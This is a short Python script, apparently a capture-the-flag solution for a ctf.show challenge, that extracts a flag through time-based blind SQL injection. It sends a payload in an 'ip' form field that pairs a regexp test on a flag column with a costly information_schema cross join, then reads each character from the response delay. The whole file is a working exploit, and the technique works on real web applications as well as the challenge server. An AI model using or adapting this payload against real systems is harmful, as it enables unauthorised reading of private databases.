from requests import post
from string import ascii_lowercase, digits
from time import time

url = 'http://01a283bc-d5ae-4ee9-85bd-87b2f015fc33.challenge.ctf.show/api/'
flag = 'ctfshow{'
payload = "if((select flagaac from ctfshow_flagxc) regexp '{}', (select count(*) from information_schema.schemata, information_schema.columns A, information_schema.columns B), 1)"

while True:
    for char in ascii_lowercase + digits + '-}':
        start = time()
        post(url, {'ip': payload.format(flag + char), 'debug': '1'})
        end = time()
        if end - start > 2:
            flag += char
            print(flag)
            if char == '}':
                exit()
            break
